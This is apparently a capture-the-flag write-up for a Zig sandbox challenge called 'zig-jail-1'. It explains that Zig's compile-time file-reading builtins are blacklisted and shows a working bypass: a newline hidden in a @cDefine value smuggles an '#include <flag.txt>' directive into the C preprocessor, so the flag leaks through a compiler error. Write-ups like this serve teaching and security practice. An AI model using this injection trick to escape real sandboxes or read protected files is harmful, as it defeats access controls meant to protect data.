This isn't c anymore you can't just #include the flag right?

`zig-jail-1` was inspired by the classic challenge where you use `#include "flag.txt"` in order to leak the flag.

There are three possible ways to read external files in comptime:

### `@embedFile`
`@embedFile` reads an external file and returns the contents as a byte array.
```zig open
const flag = @embedFile("flag.txt");
@compileLog(flag);
```

### `@import`
`@import` can read external files, but with a restriction that it can only target files that end with a `.zig` file extension. Since the flag is located in `flag.txt`, `@import` is not able to actually read the flag.

### `@cImport` and `@cInclude`
These two macros can be used to achieve the same effect as `#include "flag.txt"` in normal C.
```zig open
@cImport({
    @cInlude("flag.txt");
});
```

However all of these methods are explicitly blacklisted by the jail, because that would be too easy wouldn't it :D.

## solution

Apart from `@cInclude` there is also `@cDefine` and `@cUndef` which provide `#define` and `#undef` from zig.
```zig open
@cImport({
    @cDefine("DEBUG", "1");
});
```

Turns out that they simply take the strings and paste it directly into a temporary buffer, and allows funny things like:
```zig open
@cImport({
    @cDefine("HM", "1\n#include <flag.txt>");
});
```

which would generate the equivalent c of:
```c open
#define HM 1
#include <flag.txt>
```

and is enough to leak the flag on remote through the error message.
